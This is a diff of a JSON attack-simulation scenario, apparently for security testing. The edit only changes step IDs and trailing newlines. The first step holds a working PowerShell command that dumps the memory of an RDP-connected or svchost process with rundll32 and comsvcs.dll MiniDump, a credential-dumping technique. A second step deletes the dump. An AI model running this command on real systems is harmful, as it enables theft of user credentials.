@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "04d0951b-50e2-49f5-9571-079aa3c653f0",
+      "id": "4f3a7b43-4efd-4722-ae60-c82510d1ae96",
       "type": "execute-command",
       "data": {
-        "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n",
+        "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "0c5f5138-45bd-4007-942a-80365acc87c6",
+      "id": "a987e462-bd79-4875-9bdd-83e77ec5638e",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore\n",
+        "command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "04d0951b-50e2-49f5-9571-079aa3c653f0",
+      "s": "4f3a7b43-4efd-4722-ae60-c82510d1ae96",
       "p": "on-success",
-      "o": "0c5f5138-45bd-4007-942a-80365acc87c6"
+      "o": "a987e462-bd79-4875-9bdd-83e77ec5638e"
     },
     {
-      "s": "04d0951b-50e2-49f5-9571-079aa3c653f0",
+      "s": "4f3a7b43-4efd-4722-ae60-c82510d1ae96",
       "p": "on-failure",
-      "o": "0c5f5138-45bd-4007-942a-80365acc87c6"
+      "o": "a987e462-bd79-4875-9bdd-83e77ec5638e"
     }
   ],
   "tags": [
